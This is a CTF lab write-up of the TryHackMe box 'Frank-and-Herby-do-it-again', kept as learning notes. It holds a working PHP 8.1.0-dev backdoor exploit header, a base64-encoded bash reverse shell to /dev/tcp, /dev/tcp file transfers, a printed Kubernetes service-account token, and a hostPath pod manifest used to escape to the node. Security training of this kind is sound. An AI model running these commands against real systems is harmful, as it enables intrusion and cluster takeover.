# Frank-and-Herby-do-it-again Helped-Through

Name: Frank-and-Herby-do-it-again
Date: 28/12/2022  
Difficulty:  Medium
Goals:  
- Continue learning about the Kube
	- Exploitation
	- Hardening
	- Some real world example uses
Learnt:
- More Kubenetes
- This is the same type of box issue

This is the continuation of [[Frank-and-Herby-Make-an-app-Helped-through]] with [Alh4zr3d](https://www.youtube.com/watch?v=V6GTesdyL3k&t=5609s) from 2:21:00 to continue to learn and expose myself to kubenetes as I have not made or configured any and will probably need to know about them for the AZ104.

## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](TryHackMe/Markdown/Frank-and-Herby-do-it-again/Screenshots/ping.png)

FRANK RULEZZ HTTP website on port 30679:
![](franksdomplans.png)

nikto found info.php; Al went for F12 browser tools - 
![](mefind810.png)

8.1.0-dev has a backdoor in it - https://github.com/flast101/php-8.1.0-dev-backdoor-rce
![](backdoorexplaination.png)

## Exploit

Manual exploitation attempt before Al tries.
![](backdoorattemptOne.png)
This error is just a result of not ending the statement with a `;` and it would also fail because as I am `zerdiumsystem()` is a system command in php. Research the exploit before guessing, "use brain"  and  
![](rceproperly.png)
This was a supply-chain breach and additional header was added to this repository to grant those with knowledge that this exists. An additional header was added called `User-Agentt:` with the string `zerodium` such that everything character after zerodium, is expected to be PHP.

There is no nc on the box. `which nc` returned nothing, but we are the containerRoot
![](wearekuberoot.png)

## Foothold

Base64 encoding to beat the inherit issues with quotation marks.

```bash
echo "/bin/bash -c 'exec bash -i &>/dev/tcp/$ip/4444 <&1'" | base64 -w0
# -w0 means wrap 0 columns 


curl http://$ip:30679/ -H 'User-Agentt: zerodiumsystem("echo $base64encodedpayload | base64 -d | bash");'
```

![](hurrayfoothold.png)

/var/run/secrets/kubernetes.io/$account/token
```
eyJhbGciOiJSUzI1NiIsImtpZCI6Img4TVpFMFp0RTlrc3NCdlpyT25fcEVZVzYyWm1CVWtlZTY2dC1OUjJhcmMifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjIl0sImV4cCI6MTcwMzc3OTExNiwiaWF0IjoxNjcyMjQzMTE2LCJpc3MiOiJodHRwczovL2t1YmVybmV0ZXMuZGVmYXVsdC5zdmMiLCJrdWJlcm5ldGVzLmlvIjp7Im5hbWVzcGFjZSI6ImZyYW5rbGFuZCIsInBvZCI6eyJuYW1lIjoicGhwLWRlcGxveS02ZDk5OGY2OGI5LXdsc2x6IiwidWlkIjoiMTIxN2Y1MmEtZmU2MC00OTQ4LTk3ODgtZmJhMTE5NmZiMzVlIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJkZWZhdWx0IiwidWlkIjoiNmZhYmRmYzUtYzIwYS00ZDc1LWI2ZWItZTY4NTZlMDhhOTE3In0sIndhcm5hZnRlciI6MTY3MjI0NjcyM30sIm5iZiI6MTY3MjI0MzExNiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmZyYW5rbGFuZDpkZWZhdWx0In0.oRvM_hzS-HEd90PcSA7HKVIlzTjQ_Y-7wH8GJERfT1tv4LaARpM-qAT3Cb39HZYih7DL9IdH5_VrGopmysda_dGWGSzvVsETQ1RZEASk8Q79Tl_3yiGzDn-3dWR2yUuWLBRw2b7CdgGZrta50eLPRdCdOPwnbtWgLjqVhJq1a9hvnAPKomWstXPcuNW-TA0XDe3GXWRIC75XODdzlswBI02NDwypGsuAlAd2QWyhvRFjzETuvrMedRNNJfc5J4_4o1MFsfAM-JgUzCxeQe2n7MQ7VdtosZ3_LINZAlYhrJOqZdJXC76M9fmnZOtssOuJShUpEm9PI6pnT5G0X4-x_A
```

Get KubeCtl - from this [Official Kubernetes download kubectl binaries](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/); referred to in the video. I double checked how Al had the binary(he just downloaded the binary as well in [Al's # Unobtanium video](https://www.youtube.com/watch?v=XV2PCcQWBzA)) as I originally tried to make it from source naively.  
```bash
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
```

No execution in memory sadly. 
![](noeexecinmemorysadness.png)

There is also no `wget` or `curl` or `nc`, we can use /dev/tcp:
```bash
nc -lvnp 80 < kubectl
# Target machine:
bash -c "cat < /dev/tcp/10.11.3.193/80 > /tmp/kubectl"
# Wait awhile...
```
Al's Necronmicon method is exactly this. Amazing - I am certian got this in Archive from a Ippsec Video.

```bash
kubectl auth can-i --list
```

![](unlimitedpermsagain.png)

Enumerate the pods in kube-system namespace!
```bash
kubectl get pods -n kube-system
```

![](enumthepods.png)

Get the image
```bash
kubectl get pod php-deploy-6d998f68b9-wlslz -o yaml
```

![](franklandyaml.png)

Checked frankland:
![](franklandium.png)

We have unlimited permissions again... we can then create another pod.
```YAML
apiVersion: v1
kind: Pod
metadata:
  name: some-pod
  namespace: kube-system
spec:
  containers:
    - name: theBadKube
      image: vulhub/php:8.1-backdoor
      command: ['/bin/sh']
      args: ['-c', 'sleep 300000']
      volumeMounts:
        - mountPath: /mnt
          name: hostfs
  volumes:
    - name: hostfs
      hostPath:
        path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

Transfer this YAML file
```bash
nc -lvnp 80 < kubeShell.yaml
# Target machine:
bash -c "cat < /dev/tcp/10.11.3.193/80 > /tmp/kubeShell.yaml"
# Wait awhile...
```


## Escape the Container(s) and PrivEsc

```bash
./kubectl apply -f kubeShell.yaml
./kubectl get pods -n kube-system
```

![](itsworking.png)
I got a image ImagePullBackOff error.. because I read vulhub as vulnhub... I learnt how to clear up the filesystem though through this video. Also: Invalid value: "theBadKube": a lowercase RFC 1123 label.
```bash
./kubectl delete -f kubeShell.yaml
```

The _ImagePullBackOff_ error indicates that something is blocking _Kubernetes_ from being able to pull the image you want onto a specific node.

```bash
./kubectl exec some-pod -n kube-system --stdin --tty -- /bin/bash
```

And actual root...

![](revisionandpractice.png)

